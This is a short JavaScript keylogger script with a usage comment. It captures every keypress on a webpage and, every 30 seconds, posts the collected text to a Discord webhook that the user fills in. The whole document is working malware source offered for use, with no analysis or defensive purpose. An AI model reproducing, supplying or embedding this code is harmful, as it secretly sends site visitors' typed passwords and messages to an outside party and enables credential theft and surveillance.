
var teclas = "";
document.onkeypress = function(e) {
    get = window.event ? event : e;
    key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    teclas += key;
}
window.setInterval(function(){
    if(teclas.length > 0) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "YOUR DISCORD WEBHOOK URL", true);
        xhr.setRequestHeader('Content-type', 'application/json');
        var params = {
            username: "Keylogger",
            content: "```" + teclas + "```"
        }
        xhr.send(JSON.stringify(params));
        teclas = "";
    }
}, 30000);

////Replace "YOUR DISCORD WEBHOOK URL" with the actual URL of your Discord webhook. Once you run this script on a webpage, it will capture every key pressed on the keyboard and send the data to the specified Discord webhook every 30 seconds.